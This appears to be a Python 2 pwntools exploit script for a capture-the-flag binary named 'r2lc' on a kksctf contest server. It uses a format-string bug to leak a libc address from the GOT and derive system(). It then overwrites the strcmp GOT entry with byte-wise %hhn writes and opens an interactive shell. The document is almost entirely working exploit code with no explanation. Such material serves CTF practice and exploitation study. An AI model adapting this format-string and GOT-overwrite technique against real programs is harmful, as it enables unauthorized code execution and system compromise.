from pwn import *
context.log_level = 'debug'

TARGET = './r2lc'
HOST = 'tasks.open.kksctf.ru'
PORT = 10001

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()

if args.D:
    debug(r, [])


fp = 0x08048791
#fp2 = 0x080486b6

r.sendlineafter('name: ', '1')
r.sendlineafter('age: ', '3')
r.sendline('')

r.sendlineafter('> ', '2')
r.sendlineafter('name: ', p32(elf.got['__libc_start_main'])+'%s')
r.sendline('')

r.sendlineafter('> ', '1')
r.recvuntil('name: ')
r.recv(4)
leak = u32(r.recv(4))
dbg("leak")
base = leak - 0x1eeb0
# base = leak - 0x18d90
dbg("base")
system = base + 0x44a60
# system = base + 0x3cd10
r.sendline('')

payload = ''
for i in range(4):
    payload += p32(elf.got['strcmp']+i)

payload += '%256c'
payload += p32(fp)

offset = 256+16+4
value = system
for i in range(4):
    c = ((int(value >> (i*8)) & 0xff) - offset) % 256
    if c == 0:
        c = 256 
    payload += '%' + str(c) + 'c%' + str(i+1) + '$hhn'
    offset += c

r.sendlineafter('> ', '2')
r.sendlineafter('name: ', payload) 
r.sendline('')

r.interactive()
r.close()
